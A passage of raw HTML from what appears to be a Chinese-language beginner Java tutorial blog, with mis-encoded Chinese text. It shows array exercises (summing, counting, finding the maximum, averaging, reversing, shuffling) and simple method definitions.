class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//ç»ƒä¹ ï¼šéå†æ•°ç»„å¹¶æ±‚å’Œ</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>        <span class="hljs-type">int</span> [] theirage = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>&#125;;<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">arraylength</span> <span class="hljs-operator">=</span> theirage.length;<br><br>        System.out.println(arraylength);<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">sum</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i1</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i1 &lt; theirage.length; i1++) &#123;<br><br>            System.out.println(theirage[i1]);<br><br>            sum = sum + theirage[i1];<br><br>        &#125;<br><br>        System.out.println(<span class="hljs-string">&quot;æ•°ç»„å…ƒç´ ä¹‹å’Œä¸ºï¼š&quot;</span> + sum);<br><br>    &#125;<br>&#125;<br><span class="hljs-comment">//ç»ƒä¹ ï¼šç»Ÿè®¡ä¸ªæ•°</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>        <span class="hljs-type">int</span> [] theirage = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>, <span class="hljs-number">10</span>&#125;;<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">arraylength</span> <span class="hljs-operator">=</span> theirage.length;<br><br>        System.out.println(arraylength);<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">sum</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i1</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i1 &lt; theirage.length; i1++) &#123;<br><br>            System.out.println(theirage[i1]);<br><br>            sum = sum + theirage[i1];<br><br>            <span class="hljs-keyword">if</span> (theirage[i1] % <span class="hljs-number">3</span> ==<span class="hljs-number">0</span>)&#123;<br><br>                System.out.println(<span class="hljs-string">&quot;è¯¥æ•°å­—ï¼š&quot;</span> + theirage[i1] + <span class="hljs-string">&quot;å¯ä»¥è¢«3æ•´é™¤&quot;</span>);<br><br>                i = i +<span class="hljs-number">1</span>;<br><br>            &#125;<br><br>        &#125;<br><br>        System.out.println(<span class="hljs-string">&quot;æ•°ç»„å…ƒç´ ä¹‹å’Œä¸ºï¼š&quot;</span> + sum);<br>        <br>        System.out.println(<span class="hljs-string">&quot;è¯¥æ•°ç»„ä¸­ä¸€å…±æœ‰&quot;</span> + i + <span class="hljs-string">&quot;ä¸ªæ•°å¯è¢«3æ•´é™¤&quot;</span>);<br><br>    &#125;<br>&#125;<br><span class="hljs-comment">//ç»ƒä¹ ï¼šå˜åŒ–æ•°æ®</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>        <span class="hljs-type">int</span> [] theirage = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>, <span class="hljs-number">10</span>&#125;;<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">arraylength</span> <span class="hljs-operator">=</span> theirage.length;<br><br>        System.out.println(arraylength);<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i1</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i1 &lt; theirage.length; i1++) &#123;<br><br>            System.out.println(theirage[i1]);<br><br>            <span class="hljs-keyword">if</span> (theirage[i1] % <span class="hljs-number">2</span> !=<span class="hljs-number">0</span>)&#123;<br><br>                <span class="hljs-type">int</span> <span class="hljs-variable">doubleit</span> <span class="hljs-operator">=</span> theirage[i1] * <span class="hljs-number">2</span>;<br><br>                theirage[i1] = doubleit;<br><br>                System.out.println(<span class="hljs-string">&quot;è¯¥æ•°å­—æ˜¯å¥‡æ•°ï¼Œç§°2åçš„ç»“æœæ˜¯ï¼š&quot;</span> + doubleit);<br><br>            &#125;<span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-type">int</span> <span class="hljs-variable">chuer</span> <span class="hljs-operator">=</span> theirage[i1] / <span class="hljs-number">2</span>;<br><br>                theirage[i1] = chuer;<br><br>                System.out.println(<span class="hljs-string">&quot;è¯¥æ•°å­—æ˜¯å¶æ•°ï¼Œé™¤äºŒåçš„ç»“æœæ˜¯ï¼š&quot;</span> + chuer);<br>            &#125;<br><br>        &#125;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i1</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i1 &lt; theirage.length; i1++) &#123;<br><br>            System.out.println(theirage[i1]);<br><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ•°ç»„åŠ¨æ€åˆå§‹åŒ–</p><ul><li>åˆå§‹åŒ–æ—¶åªæŒ‡å®šæ•°ç»„é•¿åº¦ï¼Œç”±ç³»ç»Ÿä¸ºæ•°ç»„åˆ†é…åˆå§‹å€¼ã€‚</li><li>æ ¼å¼ï¼šæ•°æ®ç±»å‹[] æ•°ç»„å &#x3D; new æ•°ç»„ç±»å‹[æ•°ç»„é•¿åº¦];</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>    String[] arr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[<span class="hljs-number">50</span>];<br><br>    arr[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;zhangsan&quot;</span>;<br><br>    arr[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;lisi&quot;</span>;<br><br>        System.out.println(arr[<span class="hljs-number">0</span>]);<br><br>        System.out.println(arr[<span class="hljs-number">1</span>]);<br><br>        System.out.println(arr[<span class="hljs-number">2</span>]);<br><br>        <span class="hljs-comment">//æ•°ç»„é»˜è®¤åˆå§‹åŒ–çš„è§„å¾‹</span><br>        <span class="hljs-comment">//æ•´æ•°ç±»å‹ï¼šé»˜è®¤åˆå§‹åŒ–ä¸º0</span><br>        <span class="hljs-comment">//å°æ•°ç±»å‹ï¼šé»˜è®¤åˆå§‹åŒ–ä¸º0.0</span><br>        <span class="hljs-comment">//å­—ç¬¦ç±»å‹ï¼šé»˜è®¤åˆå§‹åŒ–ä¸º &#x27;\u0000&#x27;ï¼Œå³ç©ºæ ¼</span><br>        <span class="hljs-comment">//å¸ƒå°”ç±»å‹ï¼šé»˜è®¤åˆå§‹åŒ–ä¸º false</span><br>        <span class="hljs-comment">//å¼•ç”¨æ•°æ®ç±»å‹ï¼šé»˜è®¤åˆå§‹åŒ–ä¸ºnull</span><br><br>        <span class="hljs-type">int</span>[] arr2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">3</span>];<br><br>        System.out.println(arr2[<span class="hljs-number">0</span>]);<br><br>        System.out.println(arr2[<span class="hljs-number">1</span>]);<br><br>        System.out.println(arr2[<span class="hljs-number">2</span>]);<br><br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>ç»“æœï¼š</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs 1c">zhangsan<br>lisi<br><span class="hljs-literal">null</span><br><span class="hljs-number">0</span><br><span class="hljs-number">0</span><br><span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>é™æ€åˆå§‹åŒ–å’ŒåŠ¨æ€åˆå§‹åŒ–çš„åŒºåˆ«ï¼š</p><p><img src="/img/javalearn35.png" alt="javalearn35"></p><p>æ•°ç»„å¸¸è§é—®é¢˜</p><ul><li>å½“è®¿é—®äº†æ•°ç»„ä¸­ä¸å­˜åœ¨çš„ç´¢å¼•ï¼Œå°±ä¼šå¼•å‘ç´¢å¼•è¶Šç•Œå¼‚å¸¸ã€‚</li></ul><p>æ•°ç»„å¸¸è§æ“ä½œ</p><ul><li>æ±‚æœ€å€¼</li><li>æ±‚å’Œ</li><li>äº¤æ¢æ•°æ®</li><li>æ‰“ä¹±æ•°æ®</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//æ±‚æ•°ç»„çš„æœ€å¤§å€¼</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>        <span class="hljs-type">int</span>[] arr = &#123;<span class="hljs-number">33</span>, <span class="hljs-number">22</span>, <span class="hljs-number">5</span>, <span class="hljs-number">44</span>, <span class="hljs-number">55</span>&#125;;<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">max</span> <span class="hljs-operator">=</span> arr[<span class="hljs-number">0</span>]; <span class="hljs-comment">//æ³¨æ„è¿™é‡Œçš„maxåˆå§‹å€¼å¿…é¡»æ˜¯æ•°ç»„ä¸­çš„å€¼ï¼</span><br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; arr.length; i++) &#123;<br><br>            <span class="hljs-keyword">if</span> (arr[i] &gt; max)&#123;<br><br>                max = arr[i];<br><br>            &#125;<br>        &#125;<br>        System.out.println(<span class="hljs-string">&quot;æ•°ç»„ä¸­çš„æœ€å¤§å€¼maxä¸ºï¼š&quot;</span> + max);<br>        &#125;<br>    &#125;<br><span class="hljs-comment">//æ±‚æœ€å°å€¼ä¹Ÿæ˜¯ä¸€æ ·çš„æ€è·¯</span><br></code></pre></td></tr></table></figure><p>ç»ƒä¹ ï¼šéå†æ•°ç»„æ±‚å’Œï¼Œæ±‚å¹³å‡æ•°ï¼Œæ±‚æœ‰å¤šå°‘ä¸ªæ•°æ®æ¯”å¹³å‡å€¼å°</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Random;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">sum</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">num2</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-type">int</span>[] arr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">10</span>];<br><br>        <span class="hljs-type">Random</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Random</span>();<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; arr.length; i++) &#123;<br><br>            <span class="hljs-type">int</span> <span class="hljs-variable">number</span> <span class="hljs-operator">=</span> r.nextInt(<span class="hljs-number">100</span>) + <span class="hljs-number">1</span>;<br><br>            arr[i] = number;<br><br>        &#125;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">firstnum</span> <span class="hljs-operator">=</span> arr[<span class="hljs-number">0</span>];<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; arr.length; i++) &#123;<br>            sum = sum + arr[i];<br>            System.out.println(<span class="hljs-string">&quot;ç¬¬&quot;</span> + i + <span class="hljs-string">&quot;ä¸ªå…ƒç´ çš„å€¼ä¸ºï¼š&quot;</span> + arr[i]);<br>        &#125;<br><br>        System.out.println(<span class="hljs-string">&quot;æ•°ç»„ä¸­è¿™åä¸ªå…ƒç´ çš„å’Œä¸ºï¼š&quot;</span> + sum);<br>        <span class="hljs-type">double</span> <span class="hljs-variable">pingjunnum</span> <span class="hljs-operator">=</span> sum / <span class="hljs-number">10</span>;<br>        System.out.println(<span class="hljs-string">&quot;è¯¥æ•°ç»„çš„å¹³å‡å€¼ä¸ºï¼š&quot;</span> + pingjunnum);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; arr.length; i++) &#123;<br>            <span class="hljs-keyword">if</span> (arr[i] &gt; pingjunnum)&#123;<br>                num2 = num2 + <span class="hljs-number">1</span>;<br>            &#125;<br><br>        &#125;<br>        System.out.println(<span class="hljs-string">&quot;æ•°ç»„ä¸­å…±æœ‰ï¼š&quot;</span> + num2 + <span class="hljs-string">&quot;ä¸ªæ•°æ¯”å¹³å‡å€¼å¤§&quot;</span>);<br>    &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>ç»ƒä¹ ï¼šäº¤æ¢æ•°ç»„ä¸­çš„æ•°æ®</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">sum</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">num2</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-type">int</span>[] arr = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>&#125;;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>, j = arr.length - <span class="hljs-number">1</span>; i &lt; j; i++, j--)&#123;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">tmp</span> <span class="hljs-operator">=</span> arr[j];<br><br>            arr[j] = arr[i];<br><br>            arr[i] = tmp;<br><br><br><br><br>        &#125;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; arr.length; i++) &#123;<br><br>            System.out.println(arr[i]);<br><br>        &#125;<br><br><br><br>        &#125;<br><br>    &#125;<br><span class="hljs-comment">//ç»ƒä¹ ï¼šéšæœºäº¤æ¢</span><br><span class="hljs-keyword">import</span> java.util.Random;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">int</span>[] arr = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>&#125;;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; arr.length; i++) &#123;<br>            <span class="hljs-type">Random</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Random</span>();<br><br>            <span class="hljs-type">int</span> <span class="hljs-variable">suiji</span> <span class="hljs-operator">=</span> r.nextInt(arr.length);<br><br>            <span class="hljs-type">int</span> <span class="hljs-variable">tmp</span> <span class="hljs-operator">=</span> arr[i];<br><br>            arr[i] = arr[suiji];<br><br>            arr[suiji] = tmp;<br>        &#125;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; arr.length; i++) &#123;<br><br>            System.out.println(arr[i]);<br><br>        &#125;<br>        &#125;<br>        &#125;<br></code></pre></td></tr></table></figure><p>Javaå†…å­˜åˆ†é…</p><p><img src="/img/javalearn36.png" alt="javalearn36"></p><p><img src="/img/javalearn37.png" alt="javalearn37"></p><p><img src="/img/javalearan38.png" alt="javalearan38"></p><h3 id="æ–¹æ³•"><a href="#æ–¹æ³•" class="headerlink" title="æ–¹æ³•"></a>æ–¹æ³•</h3><ul><li>æ–¹æ³•æ˜¯ç¨‹åºä¸­æœ€å°çš„æ‰§è¡Œå•å…ƒ</li></ul><h4 id="æ–¹æ³•çš„å®šä¹‰æ ¼å¼"><a href="#æ–¹æ³•çš„å®šä¹‰æ ¼å¼" class="headerlink" title="æ–¹æ³•çš„å®šä¹‰æ ¼å¼"></a>æ–¹æ³•çš„å®šä¹‰æ ¼å¼</h4><ul><li>æœ€ç®€å•çš„æ–¹æ³•å®šä¹‰å’Œè°ƒç”¨</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> æ–¹æ³•å() &#123;<br>æ–¹æ³•ä½“<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>æ–¹æ³•è°ƒç”¨</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java">  æ–¹æ³•å();<br>  <span class="hljs-comment">//æ–¹æ³•å¿…é¡»å…ˆå®šä¹‰åè°ƒç”¨</span><br>  <span class="hljs-comment">//å†™åœ¨mainæ–¹æ³•çš„å¤–é¢ï¼Œç±»çš„é‡Œé¢</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        playGame();<br>        &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">playGame</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;aa&quot;</span>);<br>        System.out.println(<span class="hljs-string">&quot;BB&quot;</span>);<br>        System.out.println(<span class="hljs-string">&quot;CC&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        plusWhat();<br>        &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">plusWhat</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-number">2</span>;<br>        System.out.println(a + b);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>å¸¦å‚æ•°çš„æ–¹æ³•å®šä¹‰å’Œè°ƒç”¨</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> æ–¹æ³•å (å‚æ•°<span class="hljs-number">1</span>, å‚æ•°<span class="hljs-number">2.</span>...)&#123; &#125; <span class="hljs-comment">//æ³¨æ„æ•°é‡å’Œç±»å‹ä¸€ä¸€å¯¹åº”</span><br></code></pre></td></tr></table></figure><p>æ¯”å¦‚ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>        plusWhat(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>);<br>        &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">plusWhat</span><span class="hljs-params">(<span class="hljs-type">int</span> num1, <span class="hljs-type">int</span> num2)</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">sum</span> <span class="hljs-operator">=</span> num1 + num2;<br>        System.out.println(sum);<br>    